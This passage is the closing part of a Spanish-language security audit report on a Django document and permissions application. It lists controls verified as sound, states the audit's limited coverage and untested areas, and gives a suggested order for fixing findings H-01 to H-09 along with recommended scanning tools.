- `DOCENTE_PLANTA` forzado a `PENDIENTE` (`documentos/services.py:30-32`), `requiere_aprobacion` no confiada para docente.
- Checks programa en `aprobar/rechazar` (`:205-206,232-233`), `gestionar_accesos` (`permisos/views.py:29-36`), `responder_normal` solo autor (`permisos/services.py:193-194`), 2-votos sensible + 1 rechazo deniega (`:292-297,324-336`).
- `SESSION_EXPIRE_AT_BROWSER_CLOSE + SAVE_EVERY_REQUEST + COOKIE_AGE=900` (`settings.py:143-145`), `LOGIN_URL`, `logout` solo POST.
- Soft-delete + auditoría (`ELIMINO/ACTUALIZO/DESCARGO`), `.gitignore` excluye `.env` correctamente (verificado `git ls-files`).
- `DocumentoForm.clean_archivo` existe (el problema es que no se reutiliza en todos los uploads, no que falte el concepto).

---

## 8. Alcance, limitaciones y próximos pasos

- **Cobertura:** 1 run. El skill indica que runs adicionales encuentran ~mitad restante. Repetir audit enfocando negocio encadenado + `permisos` sensible + `auditoria` filtros (`fecha_inicio/fin` → 500 vs 400).
- **No ejecutado:** sin `pytest`, sin servidor, sin `pip-audit`, sin DAST. Recomendado: `python -m pip audit`, `bandit -r`, `semgrep`, tests BOLA por rol, y DAST (ZAP) contra staging con `DEBUG=False`.
- **Orden de fix sugerido:** H-01 (1 línea) → H-03 (1 línea `|safe`) → H-02 (check en servicio) → H-04+H-05 (validación central + servir con permiso) → H-06 (ownership + `next` allowlist) → H-07 (secrets + throttle) → H-08 (scope programa) → H-09 (config prod).
- **Re-auditar tras fixes** con verificación independiente (Fase 6): un revisor distinto verifica cada `file:line` + payload del §4.

*Informe generado siguiendo `security-audit-skill` (6 fases, severity likelihood×impact, solo explotables, adversarial validation). Archivos citados verificados en el árbol actual (incluye cambios working-tree no commiteados vistos en `git status`).*
